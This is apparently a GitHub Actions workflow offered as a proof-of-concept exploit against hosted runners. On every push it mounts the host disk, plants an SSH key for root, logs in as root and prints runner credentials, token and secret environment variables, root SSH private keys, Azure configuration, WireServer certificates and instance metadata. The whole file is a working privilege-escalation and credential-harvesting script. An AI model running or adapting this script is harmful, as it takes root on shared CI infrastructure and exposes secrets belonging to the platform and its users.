name: github-actions-final-exploitation
run-name: GitHub Actions Complete Exploitation POC
on: [push]
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Full Exploitation
        run: |
          sudo mkdir -p /mnt/host
          sudo mount /dev/sda1 /mnt/host
          ssh-keygen -t ed25519 -f /tmp/key -N "" -q
          sudo mkdir -p /mnt/host/root/.ssh
          sudo cp /tmp/key.pub /mnt/host/root/.ssh/authorized_keys
          sudo chown -R 0:0 /mnt/host/root/.ssh
          sudo chmod 700 /mnt/host/root/.ssh
          sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
          
          HOST_IP=$(hostname -I | awk '{print $1}')
          
          ssh -i /tmp/key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
          echo "=== ROOT ACCESS ACHIEVED ==="
          whoami && id && hostname
          
          echo ""
          echo "=== GITHUB RUNNER CREDENTIALS ==="
          cat /home/runner/actions-runner/cached/.credentials 2>/dev/null || echo "Cannot read"
          
          echo ""
          echo "=== AZURE WIRESERVER (WITH PROPER HEADERS) ==="
          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" | head -100
          
          echo ""
          echo "=== WIRESERVER CERTIFICATES ==="
          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=certificates" | head -100
          
          echo ""
          echo "=== AZURE ATTESTED DATA (DECODED) ==="
          ATTESTED=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/attested/document?api-version=2021-01-01" | jq -r .signature)
          echo "$ATTESTED" | base64 -d > /tmp/attested.der
          openssl pkcs7 -print -inform DER -in /tmp/attested.der 2>/dev/null | head -50 || echo "Cannot decode"
          
          echo ""
          echo "=== AZURE IMDS FULL METADATA ==="
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
          
          echo ""
          echo "=== GITHUB API CONNECTIONS ==="
          netstat -tnp | grep -E "140.82|20.85|20.209"
          
          echo ""
          echo "=== HOSTED-COMPUTE-AGENT DETAILS ==="
          ps aux | grep hosted-compute-agent | grep -v grep
          lsof -p $(pgrep hosted-compute-agent) 2>/dev/null | grep TCP || echo "Cannot read lsof"
          
          echo ""
          echo "=== RUNNER ENVIRONMENT ==="
          cat /proc/$(pgrep Runner.Worker)/environ 2>/dev/null | tr '\0' '\n' | grep -E "GITHUB|TOKEN|SECRET|AZURE" | head -20
          
          echo ""
          echo "=== ROOT SSH KEYS ==="
          cat /root/.ssh/id_rsa 2>/dev/null | head -10 || echo "No key"
          cat /root/.ssh/id_ed25519 2>/dev/null | head -10 || echo "No key"
          
          echo ""
          echo "=== AZURE CONFIG ==="
          cat /root/.azure/config 2>/dev/null || echo "No config"
          ls -la /root/.azure/ 2>/dev/null
          
          echo ""
          echo "=== GATEWAY MAC ==="
          ip neigh show 10.1.0.1
          
          echo ""
          echo "=== DNS RESOLUTION ==="
          dig github.com @127.0.0.53 +short
          dig api.github.com @127.0.0.53 +short
          
          echo ""
          echo "=== EXPLOITATION SUMMARY ==="
          echo "Subscription: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01)"
          echo "Resource Group: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01)"
          echo "VM Name: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01)"
          echo "Location: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01)"
          echo "VM Size: $(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/vmSize?api-version=2021-02-01)"
          EOF
